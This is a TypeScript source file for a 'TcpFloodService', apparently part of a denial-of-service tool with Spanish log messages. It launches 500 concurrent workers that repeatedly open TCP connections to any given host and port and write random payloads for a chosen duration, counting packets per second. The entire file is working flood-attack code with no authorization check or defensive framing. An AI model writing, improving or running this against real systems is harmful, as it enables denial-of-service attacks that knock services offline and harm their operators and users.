import net from 'net';
import type {TcpFloodDto} from "../models/dto/TcpFloodDto.ts";
import {generateRandomString} from "../utils/generateRandomString.ts";
export const TcpFloodService = {
    async tcpFloodAttack(dto: TcpFloodDto){
        const {host, port, time, packetSize, ws} = dto;
        const payload = generateRandomString(packetSize);
        const startTime = Date.now();
        const workers = 500;
        let packetsSent = 0;
        console.log(`Iniciando ataque hacia ${host}:${port}`);
        const sendPacket = async () =>{
            while ((Date.now() - startTime) / 1000 < time) {
                await new Promise<void>((resolve, reject) => {
                    const socket = new net.Socket();

                    socket.setTimeout(5000);

                    socket.connect({ host, port }, () => {
                        socket.write(payload, () => {
                            ws.send(`Paquete de ${packetSize} bits enviado a ${host}:${port}`);
                            console.log(`Paquete de ${packetSize} bits enviado a ${host}:${port}`);
                            packetsSent++;
                            socket.destroy();
                            resolve();
                        });
                    });

                    socket.on("error", (err) => {
                        socket.destroy();
                        resolve();
                    });

                    socket.on("timeout", () => {
                        socket.destroy();
                        resolve();
                    });
                });
            }
        }
        // @ts-ignore
        await Promise.all(Array(workers).fill().map(()=> sendPacket()))
        return `Paquetes enviados: ${packetsSent.toLocaleString()}| Paquetes por segundo: ${(Math.floor(packetsSent / time)).toLocaleString()}`;
    }
}